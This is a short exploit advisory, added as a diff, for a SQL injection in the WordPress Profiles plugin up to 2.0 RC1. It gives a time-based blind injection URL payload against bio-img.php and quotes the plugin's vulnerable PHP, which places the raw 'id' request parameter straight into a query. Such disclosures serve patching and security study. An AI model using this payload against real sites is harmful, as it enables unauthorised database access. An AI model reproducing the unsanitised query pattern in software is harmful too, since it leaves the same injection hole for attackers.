@@ -1,0 +1,18 @@
+# Exploit Title: WordPress Profiles plugin <= 2.0 RC1 SQL Injection Vulnerability
+# Date: 2011-08-28
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/profiles.2.0.RC1.zip
+# Version: 2.0 RC1 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/profiles/library/bio-img.php?id=-1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+
+---------------
+Vulnerable code
+---------------
+$query = "SELECT * FROM ".$wpdb->prefix."bios WHERE id='$_GET[id]'";
+...
+$result = mysql_query($query);
